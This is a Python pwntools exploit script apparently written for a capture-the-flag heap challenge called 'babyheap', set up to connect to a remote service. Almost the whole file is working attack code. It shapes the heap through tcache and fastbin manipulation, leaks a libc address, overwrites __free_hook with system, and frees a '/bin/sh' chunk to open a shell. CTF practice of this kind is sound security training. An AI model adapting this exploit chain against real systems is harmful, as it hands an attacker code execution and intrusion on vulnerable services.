from pwn import *
from ctypes import *
import os
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
#import roputils as rop

remote_addr = "111.186.63.20"
remote_port = 10001


uselibc = 2 #0 for no,1 for i386,2 for x64
local = 0
haslibc = 1
atta = 0

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): 
            	os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)


def pack_file_64(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _mode = 0):
    struct = p64(_flags) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xc0,"\x00")
    struct += p64(_mode)
    struct = struct.ljust(0xd8, "\x00")
    return struct


if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		elf = change_ld('./babyheap', './ld.so')
		p = elf.process(env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'c')
		#gdb.attach(p,'b *0x555555554000+0x000000000000149a\n b *0x555555554000+0x173e')



def sla(a,b):
	p.sendlineafter(a,b)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	return p.recvuntil(a)

def rl():
	return p.recvline()

def rv(a):
	return p.recv(a)

def sn(a):
	p.send(a)

def sl(a):
	p.sendline(a)

def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def alloc(size):
	sla('Command: ','1')
	sla('Size: ',str(size))

def update(idx,size,content):
	sla('Command: ','2')
	sla('Index: ',str(idx))
	sla('Size: ',str(size))
	sa('Content: ',content)

	
def delete(idx):
	sla('Command: ','3')
	sla('Index: ',str(idx))

def view(idx):
	sla('Command: ','4')
	sla('Index: ',str(idx))

def hack():
	raw_input()
	# fill tcache
	for i in range(1,6):
		for j in range(7):
			size = i*0x10 + 8
			alloc(size)
		for j in range(7):
			delete(j)

	# exhaust and align
	for i in range(0x10):
		alloc(0x18)
		update(i,0x18,'\x00'*0x18)
	for i in range(0x10):
		delete(i)

	alloc(0x58)	#0
	update(0,0x58,'\x00'*0x58)
	alloc(0x48)	#1
	update(1,0x48,'\x00'*0x48)
	alloc(0x28)	#2
	update(2,0x28,'\x00'*0x28)
	
	for i in range(3):
		alloc(0x58)	#3~5
	alloc(0x58)	#6
	alloc(0x58)	#7
	for i in range(6):
		delete(i)

	# touch first consolidate
	#raw_input()
	alloc(0x38)	#0
	update(0,0x38,'\x00'*0x38)

	for i in range(2):
		alloc(0x48)	#1~2
		update(i+1,0x48,'\x00'*0x48)	

	#raw_input()
	alloc(0x48)	#3
	alloc(0x48)	#4
	alloc(0x58)	#5
	delete(1)
	delete(6)
	alloc(0x28)	#1
	alloc(0x18) #6
	view(2)

	ru('Chunk[2]: ')
	libc.address = u64(rv(8)) - 0x60 - libc.symbols['__malloc_hook'] - 0x10
	lg('libc',libc.address)
	malloc_hook = libc.symbols['__malloc_hook'] 
	lg('malloc_hook',malloc_hook)
	free_hook = libc.symbols['__free_hook'] 
	lg('free_hook',free_hook)
	main_arena = malloc_hook + 0x10
	lg('main_arena',main_arena)
	IO_list_all = libc.symbols['_IO_list_all']
	lg('IO_list_all',IO_list_all)
	IO_str_jumps = libc.symbols['_IO_file_jumps'] + 0xc0
	lg('IO_str_jumps',IO_str_jumps)
	one_gadget = libc.address + 0x103f50
	lg('one_gadget',one_gadget)
	system = libc.symbols['system']
	lg('system',system)

	
	#raw_input()
	alloc(0x48)	#8
	alloc(0x28)	#9
	delete(8)
	delete(9)

	payload = p64(main_arena + 0x10 + 5)
	update(2,0x8,payload)
	alloc(0x48)	#8
	alloc(0x48)	#9
	payload = '\x00'*3 + p64(0)*7 + p64(free_hook-0xb58)[:6]
	update(9,len(payload),payload)
	
	for i in range(8):
		alloc(0x58)	#10
		delete(10)
		payload = '\x00'*3 + p64(0)*2
		update(9,len(payload),payload)

	alloc(0x58)	#10
	payload = p64(0) + p64(0x20000)
	update(10,len(payload),payload)
	payload = payload = '\x00'*3 + p64(0)*7 + p64(free_hook-0xb58+0x10)
	update(9,len(payload),payload)


	for i in range(0x1d):
		alloc(0x58)	#11
		delete(11)
		payload = '\x00'*3 + p64(0)*2
		update(9,len(payload),payload)
	
	#raw_input()
	alloc(0x48)	#11
	update(11,8,'/bin/sh\x00')
	alloc(0x48)	#12
	alloc(0x48)	#13
	update(13,0x10,p64(0) + p64(system))
	delete(11)
	p.interactive()

hack()

